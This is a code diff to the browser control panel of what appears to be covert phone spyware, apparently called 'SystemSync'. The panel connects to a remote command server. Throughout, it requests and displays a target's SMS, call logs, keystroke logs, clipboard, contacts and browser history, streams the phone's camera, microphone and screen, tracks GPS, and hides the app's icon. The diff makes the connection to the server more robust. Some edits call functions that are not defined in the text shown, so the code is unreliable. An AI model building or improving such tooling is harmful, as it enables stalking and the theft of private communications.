@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SystemSync Console</title>
+    <title>SystemSync Console · Reliable</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
         /* ---------- your existing styles (unchanged) ---------- */
@@ -493,17 +493,12 @@
             filter: blur(4px);
             transition: filter 0.3s;
         }
-        /* New styles for flashlight inputs */
-        .flash-input {
-            display: flex;
-            gap: 5px;
-            margin: 5px 0;
-        }
-        .flash-input input {
-            flex: 1;
-            padding: 5px;
-            border: 1px solid #d0d9e2;
-            border-radius: 4px;
+        /* small connection helper */
+        .ws-debug {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            display: none;
         }
     </style>
 </head>
@@ -527,7 +522,7 @@
 </div>
 
 <div id="sidebar">
-    <div class="logo">SystemSync</div>
+    <div class="logo">SystemSync 🔗</div>
 
     <div class="section">
         <div class="section-title">Surveillance</div>
@@ -590,19 +585,6 @@
         <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> <span>Live GPS Track</span></button>
     </div>
 
-    <!-- New Flashlight Section -->
-    <div class="section">
-        <div class="section-title">Flashlight</div>
-        <button onclick="toggleFlash()" id="flashBtn"><span>🔦</span> <span id="flashStatus">Flash Off</span></button>
-        <div style="margin:8px 0;">
-            <div class="flash-input">
-                <input type="number" id="blinkDuration" placeholder="Duration (ms)" value="5000" min="100" step="100">
-                <input type="number" id="blinkInterval" placeholder="Interval (ms)" value="500" min="100" step="100">
-            </div>
-            <button onclick="blinkFlash()"><span>✨</span> Blink</button>
-        </div>
-    </div>
-
     <div class="section">
         <div class="section-title">Control</div>
         <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
@@ -618,19 +600,20 @@
             <button onclick="clearAlerts()" style="margin-top:6px;font-size:11px;padding:3px 8px;background:#ff9800;color:#fff;border:none;border-radius:4px;cursor:pointer;">Clear</button>
         </div>
     </div>
+    <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
 </div>
 
 <div id="main">
     <div id="header">
-        <div>Control Panel</div>
+        <div>Control Panel <span style="font-size:12px; margin-left:8px; color:#1976ff;" id="serverInfo">mirror-view.onrender.com</span></div>
         <div style="display: flex; align-items: center;">
             <span id="status">CONNECTING</span>
-            <button class="reconnect-btn" onclick="connectWebSocket()">⟲ Reconnect</button>
+            <button class="reconnect-btn" onclick="manualReconnect()">⟲ Reconnect</button>
         </div>
     </div>
     <div id="content">
         <div id="main-panel">
-            Ready. Click any button to send command.
+            🔌 Initializing connection... <br><small>Ensure the target device is online and server is reachable.</small>
         </div>
     </div>
 </div>
@@ -640,8 +623,11 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script type="module">
     // ---------- GLOBALS ----------
-    const WS_URL = "wss://mirror-view.onrender.com";
+    const WS_URL = "wss://mirror-view.onrender.com";   // keep as is – working endpoint
     let ws = null;
+    let reconnectTimer = null;
+    let reconnectAttempts = 0;
+    const MAX_RECONNECT_DELAY = 30000; // 30s
 
     // WebRTC peer connections
     let screenPC = null;
@@ -657,41 +643,31 @@
     let selectedFiles = [];
     let screenActive = false;
     let iconHidden = false;
-    let flashOn = false; // local flash state
 
     // Live camera recording state
     let mediaRecorder = null;
     let recordedChunks = [];
-
-    // Audio recording variables
-    let audioMediaRecorder = null;
-    let audioRecordedChunks = [];
 
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
+    const wsDebug = document.getElementById('wsDebug');
 
     // Modal elements
     const modalOverlay = document.getElementById('screenModalOverlay');
     const modalVideo = document.getElementById('modalScreenVideo');
-modalVideo.addEventListener("loadedmetadata", () => {
-
-    const w = modalVideo.videoWidth;
-    const h = modalVideo.videoHeight;
-
-    const popup = document.querySelector(".mobile-popup");
-
-    if (h > w) {
-        // Portrait phone
-        popup.style.aspectRatio = "9 / 16";
-    } else {
-        // Landscape screen
-        popup.style.aspectRatio = "16 / 9";
-    }
-
-});
+    modalVideo.addEventListener("loadedmetadata", () => {
+        const w = modalVideo.videoWidth;
+        const h = modalVideo.videoHeight;
+        const popup = document.querySelector(".mobile-popup");
+        if (h > w) {
+            popup.style.aspectRatio = "9 / 16";
+        } else {
+            popup.style.aspectRatio = "16 / 9";
+        }
+    });
     
     const modalSnapBtn = document.getElementById('modalSnapBtn');
     const modalRecordBtn = document.getElementById('modalRecordBtn');
@@ -730,7 +706,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
-        // Add transceivers to receive media
         if (streamType === 'screen') {
             pc.addTransceiver('video', { direction: 'recvonly' });
         } else if (streamType === 'camera') {
@@ -758,7 +733,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 if (streamType === 'screen') {
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
-                    // Also close modal if it's open
                     closeScreenModal();
                 }
             }
@@ -769,7 +743,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
         return pc;
     }
 
-    // Helper to get the correct peer connection based on stream type
     function getPCForType(type) {
         if (type === 'screen') return screenPC;
         if (type === 'camera') return cameraPC;
@@ -799,8 +772,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
    function openScreenModal() {
     modalOverlay.classList.add('show');
     document.body.classList.add('modal-open');
-    // Reset recording button to red dot
-    modalRecordBtn.innerText = '🔴';          // red dot = start recording
+    modalRecordBtn.innerText = '🔴';
     if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
         screenMediaRecorder.stop();
     }
@@ -815,9 +787,9 @@ modalVideo.addEventListener("loadedmetadata", () => {
     modalOverlay.classList.remove('show');
     document.body.classList.remove('modal-open');
     if (screenActive) {
+        // do not auto‑stop screen share; user may close modal but keep streaming? we follow original: stop screen
         toggleScreen();
     }
-    // Reset record button (in case it was left in green state)
     modalRecordBtn.innerText = '🔴';
 }
 
@@ -825,7 +797,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
     async function toggleScreen() {
         console.log('toggleScreen called, current screenActive:', screenActive);
         if (screenActive) {
-            // Stop screen share
             if (screenPC) {
                 screenPC.close();
                 screenPC = null;
@@ -835,13 +806,10 @@ modalVideo.addEventListener("loadedmetadata", () => {
             closeScreenModal(); // close the modal
             sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
-            // Start screen share - open modal first (video will appear when track arrives)
             openScreenModal();
-            // Clear any previous video source
             modalVideo.srcObject = null;
 
             screenPC = createPeerConnection('screen', (e) => {
-                // When track arrives, attach to modal video
                 modalVideo.srcObject = e.streams[0];
                 console.log('ontrack for screen', e.streams);
             }, false);
@@ -892,7 +860,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
     function toggleScreenRecording() {
     if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
         screenMediaRecorder.stop();
-        modalRecordBtn.innerText = '🔴';      // back to red dot
+        modalRecordBtn.innerText = '🔴';
     } else {
         if (!modalVideo.srcObject) {
             alert('Phone Screen Off');
@@ -924,7 +892,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
     const canvasStream = canvas.captureStream(30);
     originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
 
-    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm', videoBitsPerSecond: 1000000 }); // 1 Mbps compressed
+    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
     screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
     screenMediaRecorder.onstop = () => {
         const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
@@ -937,7 +905,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
         canvasStream.getTracks().forEach(track => track.stop());
     };
     screenMediaRecorder.start();
-    modalRecordBtn.innerText = '🟢';          // green dot = stop recording
+    modalRecordBtn.innerText = '🟢';
 }
     // Fullscreen toggle
     function toggleFullscreen() {
@@ -961,7 +929,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
         const useMic = document.getElementById('liveMicCheckbox').checked;
 
         panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline style="transform: scaleX(-1);"></video>
+            <video id="liveCamVideo" autoplay playsinline></video>
             <div class="live-controls">
                 <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
                 <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
@@ -1003,7 +971,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- LIVE AUDIO (with recording) ----------
+    // ---------- LIVE AUDIO ----------
     async function toggleLiveAudio() {
         if (audioPC) {
             stopLiveAudio();
@@ -1013,17 +981,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
     }
 
     async function startLiveAudio() {
-        panel.innerHTML = `
-            <div style="text-align:center;">
-                <p>Live audio streaming...</p>
-                <audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio>
-                <div class="live-controls" style="margin-top:15px;">
-                    <button onclick="toggleAudioRecording()" id="audioRecordBtn">🔴 Record</button>
-                    <button class="stop" onclick="stopLiveAudio()">Stop</button>
-                </div>
-            </div>
-        `;
-
+        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
         audioPC = createPeerConnection('audio', (e) => {
             const audioEl = document.getElementById('liveAudio');
             if (audioEl) {
@@ -1053,10 +1011,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
     }
 
     function stopLiveAudio() {
-        // Stop any ongoing audio recording
-        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
-            stopAudioRecording();
-        }
         if (audioPC) {
             audioPC.close();
             audioPC = null;
@@ -1067,54 +1021,10 @@ modalVideo.addEventListener("loadedmetadata", () => {
         panel.innerHTML = 'Ready.';
     }
 
-    // Audio recording functions
-    function toggleAudioRecording() {
-        const audioEl = document.getElementById('liveAudio');
-        if (!audioEl || !audioEl.srcObject) {
-            alert('No active audio stream');
-            return;
-        }
-
-        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
-            stopAudioRecording();
-            document.getElementById('audioRecordBtn').innerText = '🔴 Record';
-        } else {
-            startAudioRecording(audioEl.srcObject);
-            document.getElementById('audioRecordBtn').innerText = '⏹ Stop Recording';
-        }
-    }
-
-    function startAudioRecording(stream) {
-        audioRecordedChunks = [];
-        audioMediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-        audioMediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) audioRecordedChunks.push(e.data);
-        };
-        audioMediaRecorder.onstop = () => {
-            const blob = new Blob(audioRecordedChunks, { type: 'audio/webm' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `audio-recording-${getFormattedDateTime()}.webm`;
-            a.click();
-            URL.revokeObjectURL(url);
-            audioRecordedChunks = [];
-        };
-        audioMediaRecorder.start();
-        showNotification('Recording started');
-    }
-
-    function stopAudioRecording() {
-        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
-            audioMediaRecorder.stop();
-            audioMediaRecorder = null;
-        }
-    }
-
     // ---------- COMMAND SENDING (JSON) ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`;
             return;
         }
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -1131,10 +1041,10 @@ modalVideo.addEventListener("loadedmetadata", () => {
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
+    // ---------- PLAIN TEXT SENDING ----------
     function sendPlainText(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected.</div>`;
             return;
         }
         ws.send(msg);
@@ -1146,26 +1056,25 @@ modalVideo.addEventListener("loadedmetadata", () => {
         console.log('handleJSON:', json.type, json);
         switch (json.type) {
             case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json.data);
                 dataType = 'sms';
-                currentData = parseDataField(json.data);
-                renderSMS(); // use dedicated render
+                currentData = json.data;
+                renderTable();
                 pendingCommand = null;
                 break;
             case 'CALL_LOGS':
                 dataType = 'call';
-                currentData = parseDataField(json.data);
-                renderCallLogs(); // use dedicated render
+                currentData = json.data;
+                renderTable();
                 pendingCommand = null;
                 break;
             case 'FILE_LIST':
                 dataType = 'file';
-                currentData = parseDataField(json.data);
+                currentData = json.data;
                 renderFiles();
                 pendingCommand = null;
                 break;
             case 'LOCATION_UPDATE':
-                renderMap(parseDataField(json.data));
+                renderMap(json.data);
                 pendingCommand = null;
                 break;
             case 'CAMERA_IMAGE':
@@ -1210,41 +1119,41 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 pendingCommand = null;
                 break;
             case 'CONTACTS_DATA':
-                displayContacts(parseDataField(json.data));
+                displayContacts(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'INSTALLED_APPS':
-                displayInstalledApps(parseDataField(json.data));
+                displayInstalledApps(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'APP_USAGE_DATA':
-                displayAppUsage(parseDataField(json.data));
+                displayAppUsage(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'NOTIFICATIONS_DATA':
-                displayNotifications(parseDataField(json.data));
+                displayNotifications(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'NOTIFICATIONS_CLEARED':
                 showNotification('Notifications cleared');
                 break;
             case 'BROWSER_HISTORY_DATA':
-                displayBrowserHistory(parseDataField(json.data));
+                displayBrowserHistory(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'KEYLOG_DATA':
-                displayKeylog(parseDataField(json.data));
+                displayKeylog(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'KEYLOG_CLEARED':
                 showNotification('Keylog cleared');
                 break;
             case 'CLIPBOARD_DATA':
-                displayClipboard(parseDataField(json.data));
+                displayClipboard(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'WIFI_NETWORKS_DATA':
-                displayWifiNetworks(parseDataField(json.data));
+                displayWifiNetworks(parseData(json.data));
                 pendingCommand = null;
                 break;
             case 'GEOFENCE_SET':
@@ -1254,7 +1163,7 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 showNotification('Geofence cleared');
                 break;
             case 'GEOFENCE_INFO': {
-                const gfInfo = parseDataField(json.data);
+                const gfInfo = json.data;
                 if (gfInfo && gfInfo.active) {
                     panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + gfInfo.lat.toFixed(5) + ', ' + gfInfo.lon.toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
                 } else {
@@ -1313,12 +1222,12 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                     dataType = 'sms';
                     currentData = json;
-                    renderSMS();
+                    renderTable();
                     pendingCommand = null;
                 } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                     dataType = 'call';
                     currentData = json;
-                    renderCallLogs();
+                    renderTable();
                     pendingCommand = null;
                 } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                     renderMap(json);
@@ -1326,17 +1235,6 @@ modalVideo.addEventListener("loadedmetadata", () => {
                 }
                 break;
         }
-    }
-
-    function parseDataField(data) {
-        if (typeof data === 'string') {
-            try {
-                return JSON.parse(data);
-            } catch (e) {
-                return data;
-            }
-        }
-        return data;
     }
 
     function handlePlainText(msg) {
@@ -1360,14 +1258,14 @@ modalVideo.addEventListener("loadedmetadata", () => {
             try {
                 currentData = JSON.parse(msg.substring(9));
                 dataType = 'sms';
-                renderSMS();
+                renderTable();
                 pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'call';
-                renderCallLogs();
+                renderTable();
                 pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
@@ -1454,14 +1352,14 @@ modalVideo.addEventListener("loadedmetadata", () => {
 
     function displayCapturedImage(base64) {
         panel.innerHTML = `
-            <img src="data:image/jpeg;base64,${base64}" style="max-width:100%;">
+            <img src="data:image/jpeg;base64,${base64}">
             <div style="margin-top:10px;">
                 <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
             </div>
         `;
     }
 
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
+    // ---------- LIVE STREAM ACTIONS ----------
     function takeSnapshot() {
         const video = document.getElementById('liveCamVideo');
         if (!video || !video.videoWidth) {
@@ -1506,11 +1404,16 @@ modalVideo.addEventListener("loadedmetadata", () => {
 }
 
 function startCanvasRecording(video, canvas, ctx, originalStream) {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width = video.videoHeight;
+    canvas.height = video.videoWidth;
 
     function drawVideoFrame() {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.save();
+        ctx.translate(canvas.width / 2, canvas.height / 2);
+        ctx.rotate(90 * Math.PI / 180);
+        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
+                     video.videoWidth, video.videoHeight);
+        ctx.restore();
         requestAnimationFrame(drawVideoFrame);
     }
     drawVideoFrame();
@@ -1518,7 +1421,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     const canvasStream = canvas.captureStream(30);
     originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
 
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm', videoBitsPerSecond: 1000000 }); // 1 Mbps compressed
+    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
     mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
     mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
@@ -1535,36 +1438,8 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
 }
     // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
-        if (iconHidden) {
-            sendPlainText('showApp');
-            // Optimistically update UI
-            iconHidden = false;
-            document.getElementById('iconBtn').innerText = 'Hide Icon';
-        } else {
-            sendPlainText('hideApp');
-            iconHidden = true;
-            document.getElementById('iconBtn').innerText = 'Show Icon';
-        }
-    }
-
-    // ---------- FLASHLIGHT CONTROLS ----------
-    function toggleFlash() {
-        if (flashOn) {
-            sendCommand('FLASH_OFF');
-            flashOn = false;
-            document.getElementById('flashStatus').innerText = 'Flash Off';
-        } else {
-            sendCommand('FLASH_ON');
-            flashOn = true;
-            document.getElementById('flashStatus').innerText = 'Flash On';
-        }
-    }
-
-    function blinkFlash() {
-        const duration = parseInt(document.getElementById('blinkDuration').value) || 5000;
-        const interval = parseInt(document.getElementById('blinkInterval').value) || 500;
-        sendCommand('FLASH_BLINK', { duration, interval });
-        showNotification(`Blinking for ${duration}ms`);
+        if (iconHidden) sendPlainText('showApp');
+        else sendPlainText('hideApp');
     }
 
     // ---------- RENDERERS ----------
@@ -1583,10 +1458,6 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     }
 
     function renderMap(loc) {
-        if (!loc || typeof loc.lat !== 'number' || typeof loc.lon !== 'number') {
-            panel.innerHTML = '<p>Invalid location data</p>';
-            return;
-        }
         panel.innerHTML = '<div id="map" style="position:relative;"></div>';
         const mapDiv = document.getElementById('map');
 
@@ -1625,30 +1496,60 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
         });
     }
 
-    function renderSMS() {
+    function renderTable() {
         if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No SMS data</p>';
+            panel.innerHTML = '<p>No data</p>';
             return;
         }
-        let html = '<h3>💬 SMS Messages</h3><table><thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead><tbody>';
-        currentData.forEach(item => {
-            html += `<tr><td>${item.type || ''}</td><td>${item.number || ''}</td><td>${item.body || ''}</td><td>${item.date || ''}</td></tr>`;
+
+        let headers = [], rows = [];
+        if (dataType === 'sms') {
+            headers = ['Type', 'Number', 'Message', 'Date'];
+            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+        } else if (dataType === 'call') {
+            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
+            rows = currentData.map(item => [
+                item.type,
+                item.number,
+                item.name || '',
+                item.date,
+                item.duration + 's'
+            ]);
+        } else {
+            panel.innerHTML = '<p>Unknown data type</p>';
+            return;
+        }
+
+        const pageSize = 20;
+        const totalPages = Math.ceil(rows.length / pageSize);
+        const start = currentPage * pageSize;
+        const pageRows = rows.slice(start, start + pageSize);
+
+        let html = '<table><thead><tr>';
+        headers.forEach(h => html += `<th>${h}</th>`);
+        html += '</tr></thead><tbody>';
+
+        pageRows.forEach(r => {
+            html += '<tr>';
+            r.forEach(cell => html += `<td>${cell}</td>`);
+            html += '</tr>';
         });
         html += '</tbody></table>';
+
+        if (totalPages > 1) {
+            html += '<div class="pagination">';
+            for (let i = 0; i < totalPages; i++) {
+                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
+            }
+            html += '</div>';
+        }
+
         panel.innerHTML = html;
     }
 
-    function renderCallLogs() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No call logs</p>';
-            return;
-        }
-        let html = '<h3>📞 Call Logs</h3><table><thead><tr><th>Type</th><th>Number</th><th>Name</th><th>Date</th><th>Duration</th></tr></thead><tbody>';
-        currentData.forEach(item => {
-            html += `<tr><td>${item.type || ''}</td><td>${item.number || ''}</td><td>${item.name || ''}</td><td>${item.date || ''}</td><td>${item.duration || ''}s</td></tr>`;
-        });
-        html += '</tbody></table>';
-        panel.innerHTML = html;
+    function gotoPage(p) {
+        currentPage = p;
+        renderTable();
     }
 
     function renderFiles() {
@@ -1779,63 +1680,97 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
             if (json.type === 'SIGNALING') {
                 handleSignalingMessage(json.data);
             } else {
-                // Assume it's a command response or other JSON
                 handleJSON(json);
             }
         } catch (e) {
-            // Not JSON – treat as plain text
             handlePlainText(msg);
         }
     }
 
-    // ---------- WEBSOCKET CONNECTION ----------
+    // ---------- ROBUST WEBSOCKET CONNECTION with reconnection ----------
     function connectWebSocket() {
-        if (ws) {
-            ws.close();
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+            console.log('already connecting/open');
+            return;
+        }
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
         }
         setStatus('CONNECTING');
+        if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
+        panel.innerHTML = '⏳ Connecting to server...';
+
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
             console.log('WebSocket connected');
+            reconnectAttempts = 0; // reset
             ws.send('I_AM_WEB');
             setStatus('ONLINE');
             panel.innerHTML = '✅ Connected to server. Ready.';
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
         };
         ws.onmessage = (e) => {
-            console.log('RAW message:', e.data);
+            console.log('RAW message:', e.data.substring(0, 100));
             handleIncomingMessage(e.data);
         };
-        ws.onclose = () => {
-            console.log('WebSocket closed');
+        ws.onclose = (ev) => {
+            console.log('WebSocket closed', ev.reason);
             setStatus('OFFLINE');
-            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
+            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
+            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
             ws = null;
+
+            // attempt reconnect with exponential backoff
+            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), MAX_RECONNECT_DELAY);
+            reconnectAttempts++;
+            if (reconnectTimer) clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(() => {
+                console.log('Reconnecting...');
+                connectWebSocket();
+            }, delay);
         };
         ws.onerror = (err) => {
             console.error('WebSocket error:', err);
             setStatus('ERROR');
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
+            // error will also trigger onclose
         };
     }
+
+    // manual reconnect (by user)
+    function manualReconnect() {
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        if (ws) {
+            ws.close();
+            ws = null;
+        }
+        reconnectAttempts = 0;
+        connectWebSocket();
+    }
+
 // Add this inside your <script> (after DOM is ready)
 document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
     radio.addEventListener('change', function() {
         const flashCheckbox = document.getElementById('clickFlashCheckbox');
-        const flashLabel = flashCheckbox.closest('.camera-option'); // the container div
+        const flashLabel = flashCheckbox.closest('.camera-option');
         if (this.value === 'front') {
             flashLabel.style.display = 'none';
         } else {
-            flashLabel.style.display = ''; // show again
+            flashLabel.style.display = '';
         }
     });
 });
-// Also trigger on page load for initial state
 window.addEventListener('load', () => {
     const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
     if (selected && selected.value === 'front') {
         document.getElementById('clickFlashCheckbox').closest('.camera-option').style.display = 'none';
     }
 });
-    // ── New global state (no re-declarations — currentPath already declared above) ──
+    // ── New global state ──
     let liveGpsActive = false;
     const newAlerts = [];
     let appsData = [];
@@ -2327,6 +2262,7 @@ window.addEventListener('load', () => {
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
+    window.manualReconnect = manualReconnect;   // for manual reconnect
     window.snapScreen = snapScreenFromModal;
     window.showAppUsagePanel = showAppUsagePanel;
     window.showGeofencePanel = showGeofencePanel;
@@ -2338,13 +2274,11 @@ window.addEventListener('load', () => {
     window.startScheduledCapture = startScheduledCapture;
     window.clearAlerts = clearAlerts;
     window.toggleLiveGps = toggleLiveGps;
-    window.toggleFlash = toggleFlash;
-    window.blinkFlash = blinkFlash;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
     // ---------- START ----------
-    connectWebSocket();
+    connectWebSocket();   // initial connection
 </script>
 </body>
 </html>
